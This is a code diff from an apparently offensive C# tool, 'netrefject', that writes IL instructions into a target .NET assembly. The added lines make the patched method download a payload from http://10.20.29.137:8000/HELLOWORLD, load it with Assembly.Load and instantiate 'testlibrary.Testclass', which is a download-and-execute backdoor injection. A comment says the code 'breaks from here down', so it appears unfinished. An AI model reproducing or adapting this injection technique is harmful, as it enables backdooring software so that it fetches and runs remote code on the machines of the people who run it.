@@ -480,15 +480,17 @@ namespace netrefject
             //ilp.Append(Instruction.Create(OpCodes.Ldloc_1));
 
             ilp.Append(Instruction.Create(OpCodes.Ldstr, "http://10.20.29.137:8000/HELLOWORLD"));
-            ilp.Append(Instruction.Create(OpCodes.Call, m1.Module.ImportReference(typeof(WebClient).GetMethod("DownloadData", new Type[] { typeof(string) }))));
+            ilp.Append(Instruction.Create(OpCodes.Callvirt, m1.Module.ImportReference(typeof(WebClient).GetMethod("DownloadData", new Type[] { typeof(string) }))));
             ilp.Append(Instruction.Create(OpCodes.Stloc_0));
-            //ilp.Append(Instruction.Create(OpCodes.Ldloc_0));
+            //Breaks from here down
+            ilp.Append(Instruction.Create(OpCodes.Ldloc_0));
+            ilp.Append(Instruction.Create(OpCodes.Call, refs.Assembly_Load));
+            ilp.Append(Instruction.Create(OpCodes.Ldstr, "testlibrary.Testclass"));
+            ilp.Append(Instruction.Create(OpCodes.Callvirt, m1.Module.ImportReference(typeof(Assembly).GetMethod("CreateInstance", new Type[] { typeof(string) }))));
+            ilp.Append(Instruction.Create(OpCodes.Stloc_1));
 
-            //ilp.Append(ilp.Create (OpCodes.Call, m1.Module.ImportReference (typeof (Console).GetMethod ("WriteLine", new [] { typeof (string) }))));
-            //ilp.Append(Instruction.Create(OpCodes.Call, m1.Module.ImportReference(typeof(WebClient).GetMethod("DownloadData", new Type[] { typeof(string) }))));
-            //ilp.Append(Instruction.Create(OpCodes.Stloc_1));
-            //ilp.Append(Instruction.Create(OpCodes.Ldloc_1));
-
+            ilp.Append(ilp.Create (OpCodes.Ldstr, "Wattefok dit werk nou bra"));
+            ilp.Append(ilp.Create (OpCodes.Call, m1.Module.ImportReference (typeof (Console).GetMethod ("WriteLine", new [] { typeof (string) }))));
 
             ilp.Append(Instruction.Create(OpCodes.Nop));
             
